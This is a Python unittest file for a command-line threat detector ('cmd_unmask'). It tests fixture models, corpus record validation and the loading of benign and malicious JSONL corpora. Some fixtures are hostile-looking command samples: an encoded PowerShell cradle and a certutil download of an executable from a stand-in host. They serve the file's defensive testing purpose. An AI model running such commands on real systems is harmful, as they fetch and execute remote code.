import json
import os
import tempfile
import unittest
from pathlib import Path

from cmd_unmask.corpus import (
    load_corpus_file,
    load_seed_corpus,
    parse_corpus_record,
)
from cmd_unmask.models import (
    BenchmarkReport,
    CorpusFixture,
    FixtureResult,
    Severity,
)


class TestCorpusSchemaAndSeedDataset(unittest.TestCase):
    def test_models_serialization(self):
        fixture = CorpusFixture(
            fixture_id="mal-001",
            label="malicious",
            command="powershell -enc SQBFAFgA",
            expected_severity=Severity.HIGH,
            min_severity=Severity.MEDIUM,
            max_severity=Severity.CRITICAL,
            expected_techniques=["T1059.001"],
            expected_iocs=["evil.example"],
            must_not_match=["BENIGN-001"],
            description="Sample cradle",
        )
        self.assertEqual(fixture.to_dict()["expected_severity"], "HIGH")

        res = FixtureResult(
            fixture_id="mal-001",
            label="malicious",
            passed=True,
            actual_severity=Severity.HIGH,
            actual_risk_score=75,
            latency_ms=1.25,
        )
        self.assertEqual(res.to_dict()["actual_severity"], "HIGH")

        report = BenchmarkReport(
            total=1,
            passed=1,
            failed=0,
            true_positives=1,
            false_positives=0,
            false_negatives=0,
            true_negatives=0,
            precision=1.0,
            recall=1.0,
            fpr=0.0,
            p50_ms=1.25,
            p95_ms=1.25,
            results=[res],
        )
        payload = report.to_dict()
        self.assertEqual(payload["precision"], 1.0)
        self.assertEqual(len(payload["results"]), 1)

    def test_parse_corpus_record_validation(self):
        valid = parse_corpus_record(
            {
                "fixture_id": "ben-001",
                "label": "benign",
                "command": "dir C:\\",
                "expected_severity": "BENIGN",
                "expected_techniques": [],
                "expected_iocs": [],
                "must_not_match": [],
            }
        )
        self.assertEqual(valid.fixture_id, "ben-001")
        self.assertEqual(valid.expected_severity, Severity.BENIGN)

        with self.assertRaises(ValueError):
            parse_corpus_record({"fixture_id": "", "label": "benign", "command": "dir"})

        with self.assertRaises(ValueError):
            parse_corpus_record({"fixture_id": "x", "label": "unknown", "command": "dir"})

        with self.assertRaises(ValueError):
            parse_corpus_record(
                {"fixture_id": "x", "label": "benign", "command": "dir", "expected_severity": "NOT_A_SEV"}
            )

    def test_load_corpus_file_jsonl_and_missing(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            p = Path(tmpdir) / "sample.jsonl"
            p.write_text(
                json.dumps({"fixture_id": "f1", "label": "benign", "command": "git status"}) + "\n"
                + "\n"
                + json.dumps({"fixture_id": "f2", "label": "malicious", "command": "certutil -urlcache -f http://a.example/x.exe x.exe"}) + "\n",
                encoding="utf-8",
            )
            fixtures = load_corpus_file(p)
            self.assertEqual(len(fixtures), 2)
            self.assertEqual(fixtures[0].fixture_id, "f1")
            self.assertEqual(fixtures[1].label, "malicious")

        with self.assertRaises(ValueError):
            load_corpus_file(Path("nonexistent_corpus_file.jsonl"))

    def test_seed_corpus_datasets_present_and_valid(self):
        repo_root = Path(__file__).resolve().parent.parent
        benign_path = repo_root / "corpus" / "benign.jsonl"
        malicious_path = repo_root / "corpus" / "malicious.jsonl"

        self.assertTrue(benign_path.is_file(), "corpus/benign.jsonl must exist")
        self.assertTrue(malicious_path.is_file(), "corpus/malicious.jsonl must exist")

        benign = load_corpus_file(benign_path)
        malicious = load_corpus_file(malicious_path)
        self.assertGreaterEqual(len(benign), 25)
        self.assertGreaterEqual(len(malicious), 25)
        self.assertTrue(all(f.label == "benign" for f in benign))
        self.assertTrue(all(f.label == "malicious" for f in malicious))
        self.assertTrue(all(f.category != "uncategorized" for f in benign + malicious))

        combined = load_seed_corpus()
        self.assertEqual(len(combined), len(benign) + len(malicious))
        ids = [f.fixture_id for f in combined]
        self.assertEqual(len(ids), len(set(ids)), "fixture_ids must be unique")


if __name__ == "__main__":
    unittest.main()
